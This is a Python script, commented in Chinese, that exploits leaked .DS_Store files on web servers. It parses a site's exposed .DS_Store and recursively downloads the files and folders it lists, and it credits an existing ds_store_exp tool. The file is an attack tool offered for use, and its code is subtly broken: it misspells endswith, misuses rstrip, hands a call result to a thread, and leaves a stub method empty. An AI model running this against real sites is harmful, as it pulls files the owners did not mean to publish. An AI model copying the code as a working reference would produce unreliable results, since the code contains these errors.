#!/usr/bin/env python3
# -*- coding-utf-8 -*-

import os
import queue
import threading
from io import BytesIO
import fire
from loguru import logger

import requests
from ds_store import DSStore
from urllib.parse import urlparse


class DsStore(object):
    """
    .DS_Store 文件泄露利用，解析 .DS_Store 并递归下载文件
    待优化：多线程下载

    Usage:
        # python3 ds_store_exp.py ds_store_exp --url https://www.example.com/.DS_Store
        # python3 ds_store_exp.py ds_store_exp --url https://www.example.com/
        python3 ds_store_exp.py single_process --url https://www.example.com/test/test1/.DS_Store
        python3 ds_store_exp.py multi_process --url https://www.example.com/test/test1/.DS_Store
    """
    def __init__(self, url = 'https://www.example.com/.DS_Store'):
        self.url = url
        self.queue = queue.Queue()
        self.queue.put(url)
        self.processed_url = set()
        self.lock = threading.Lock()
        self.working_thread = 0
        self.dest_dir = os.path.abspath('.')

    def is_valid_name(self, entry_name):
        if entry_name.find('..') >= 0 or \
                entry_name.startswith('/') or \
                entry_name.startswith('\\') or \
                not os.path.abspath(entry_name).startswith(self.dest_dir):
            try:
                logger.error(f"Invalid entry name: {entry_name}")
            except Exception as e:
                pass
            return False
        return True

    def single_process(self, url, download_dir = './'):
        new_url = url.rstrip('.DS_Store')
        schema, netloc, path, _, _, _ = urlparse(url, 'http')
        try:
            response = requests.get(url, allow_redirects = False)
        except Exception as e:
            logger.error(e)
            return

        if response.status_code == 200:
            folder_name = netloc + '/'.join(path.split('/')[:-1])
            if not os.path.exists(download_dir + folder_name):
                os.makedirs(download_dir + folder_name)
            with open(download_dir + netloc + path, 'wb') as f:
                try:
                    logger.info(f"[{response.status_code}] {url}")
                    f.write(response.content)
                except Exception as e:
                    logger.error(e)
            if url.endswitch('.DS_Store'):
                ds_store_file = BytesIO()
                ds_store_file.write(response.content)
                with DSStore.open(ds_store_file) as ds_store:
                    dirs_files = set()
                    for  x in ds_store._traverse(None):
                        if self.is_valid_name(x.filename):
                            dirs_files.add(x.filename)
                    for name in dirs_files:
                        if name != '.':
                            self.queue.put(new_url + name)
                            if len(name) <= 4 or name[-4] != '.':
                                self.queue.put(new_url + name + '/.DS_Store')

    def multi_process(self, url):
        while True:
            try:
                url = self.queue.get(timeout = 2.0)
                with self.lock:
                    self.working_thread += 1
            except queue.Empty:
                if self.working_thread == 0:
                    break
                else:
                    continue
            
            try:
                if url in self.processed_url:
                    continue
                else:
                    self.processed_url.add(url)
                self.single_process(url)
            except Exception as e:
                self.lock.acquire()
                logger.error(e)
                self.lock.release()
            finally:
                self.working_thread -= 1
    
    def scan(self, url):
        all_threads = []
        t = threading.Thread(target=self.multi_process(url))
        all_threads.append(t)
        t.start()
    
    def ds_store_exp(self, url):
        """
        .DS_Store 文件泄露利用，解析 .DS_Store 并递归下载文件
        Reference:
            https://github.com/lijiejie/ds_store_exp
        """
        pass

    def read_ds_store(self, ds_store_file = '../data/.DS_Store'):
        with DSStore.open(ds_store_file) as ds_store:
            dirs_files = set()
            for  x in ds_store._traverse(None):
                if self.is_valid_name(x.filename):
                    dirs_files.add(x.filename)
            for name in dirs_files:
                logger.info(name)

    def main(self):
        self.url = "https://www.example.com/test/test1/.DS_Store"
        self.single_process(self.url)
        self.scan()

if __name__ == '__main__':
    fire.Fire(DsStore)